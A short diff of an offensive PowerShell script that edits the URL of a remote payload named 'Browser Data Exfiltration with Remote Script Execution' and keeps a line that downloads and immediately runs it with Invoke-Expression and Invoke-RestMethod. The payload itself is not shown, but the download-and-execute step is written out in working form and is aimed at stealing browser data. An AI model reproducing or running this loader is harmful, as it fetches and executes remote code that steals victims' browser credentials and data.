@@ -15,7 +15,7 @@ if ([string]::IsNullOrEmpty($dc)) {
 
 # Download and execute remote script via Invoke-RestMethod
 try {
-    $scriptUrl = 'https://raw.githubusercontent.com/Pureach/ronin_downloader/refs/heads/main/Browser%20Data%20Exfiltration%20with%20Remote%20Script%20Execution.ps1'
+    $scriptUrl = 'https://raw.githubusercontent.com/Pureach/ronin_downloader/main/Browser%20Data%20Exfiltration%20with%20Remote%20Script%20Execution.ps1'
     Invoke-Expression -Command (Invoke-RestMethod -Uri $scriptUrl -UseBasicParsing).Content
 } catch {
     Write-Host 'Failed to download and execute the data extraction script.'
